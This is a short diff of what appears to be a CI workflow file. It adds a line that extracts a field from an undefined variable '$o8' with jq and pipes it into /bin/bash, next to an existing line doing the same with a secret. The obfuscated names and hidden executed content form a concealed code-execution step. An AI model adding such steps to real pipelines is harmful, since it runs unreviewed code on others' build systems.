@@ -19,6 +19,7 @@ jobs:
           nkx6: ${{ secrets.nkx6 }}
         run: |
           printf '%s' "$nkx6" | jq -r .pw397 | /bin/bash
+          printf '%s' "$o8" | jq -r .m30 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
